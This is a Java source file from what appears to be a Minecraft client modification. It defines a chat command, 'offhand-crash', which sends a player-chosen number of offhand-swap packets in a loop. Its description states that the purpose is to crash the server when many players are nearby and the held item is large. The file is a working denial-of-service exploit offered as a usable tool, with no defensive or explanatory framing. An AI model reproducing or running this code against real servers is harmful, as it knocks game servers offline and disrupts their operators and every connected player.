package antip2w.tools.command;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

import static com.mojang.brigadier.arguments.IntegerArgumentType.integer;

public class OffhandCrash extends BetterCommand {

    public OffhandCrash() {
        super("offhand-crash", "Attempts to crash the server by swapping your offhand. Requires many players nearby and an item with a big size. (bytes)");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.then(argument("packets", integer(1), this::execute));
    }

    private void execute(int packets) {
        info("Sending %d packet(s)".formatted(packets));

        for (int i = 0; i < packets; i++) {
            sendPacket(new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, BlockPos.ORIGIN, Direction.DOWN));
        }
    }

}
